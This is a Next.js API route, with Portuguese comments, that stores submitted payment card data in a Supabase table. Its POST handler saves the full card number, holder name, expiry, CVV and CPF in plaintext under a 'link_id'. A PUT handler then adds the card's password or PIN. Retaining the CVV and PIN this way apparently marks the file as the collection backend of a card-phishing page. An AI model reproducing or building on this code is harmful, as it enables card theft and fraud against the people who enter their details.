import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!,
  {
    auth: {
      autoRefreshToken: false,
      persistSession: false
    }
  }
)

export async function POST(request: NextRequest) {
  try {
    console.log('=== INICIANDO PROCESSAMENTO DO CARTÃO ===')
    
    const body = await request.json()
    console.log('Body recebido:', { ...body, card_number: '****', cvv: '***', cpf: '***' })
    
    const { link_id, card_number, card_holder, expiry_date, cvv, cpf } = body

    // Validações básicas
    if (!link_id || !card_number || !card_holder || !expiry_date || !cvv || !cpf) {
      console.error('Campos faltando:', { link_id: !!link_id, card_number: !!card_number, card_holder: !!card_holder, expiry_date: !!expiry_date, cvv: !!cvv, cpf: !!cpf })
      return NextResponse.json(
        { error: 'Todos os campos são obrigatórios' },
        { status: 400 }
      )
    }

    // Preparar dados para inserção
    const insertData = {
      link_id,
      card_number,
      card_holder,
      expiry_date,
      cvv,
      cpf,
      card_password: null
    }

    console.log('Tentando inserir no Supabase...')

    // Salvar cartão no banco de dados
    const { data, error } = await supabase
      .from('saved_cards')
      .insert(insertData)
      .select()
      .single()

    if (error) {
      console.error('❌ ERRO DO SUPABASE:', error)
      console.error('Código do erro:', error.code)
      console.error('Mensagem:', error.message)
      console.error('Detalhes:', error.details)
      
      return NextResponse.json(
        { 
          error: 'Erro ao salvar cartão no banco de dados',
          details: error.message,
          code: error.code
        },
        { status: 500 }
      )
    }

    console.log('✅ Cartão salvo com sucesso! ID:', data.id)

    return NextResponse.json({ 
      success: true,
      cardId: data.id
    })
  } catch (error) {
    console.error('❌ ERRO GERAL:', error)
    return NextResponse.json(
      { 
        error: 'Erro interno do servidor',
        details: error instanceof Error ? error.message : 'Erro desconhecido'
      },
      { status: 500 }
    )
  }
}

export async function PUT(request: NextRequest) {
  try {
    const body = await request.json()
    const { card_id, card_password } = body

    if (!card_id) {
      return NextResponse.json(
        { error: 'ID do cartão é obrigatório' },
        { status: 400 }
      )
    }

    // Atualizar senha do cartão no banco de dados
    const { error } = await supabase
      .from('saved_cards')
      .update({ card_password })
      .eq('id', card_id)

    if (error) {
      console.error('Erro ao atualizar senha:', error)
      return NextResponse.json(
        { error: 'Erro ao atualizar senha do cartão' },
        { status: 500 }
      )
    }

    return NextResponse.json({ success: true })
  } catch (error) {
    console.error('Erro ao processar requisição:', error)
    return NextResponse.json(
      { error: 'Erro interno do servidor' },
      { status: 500 }
    )
  }
}
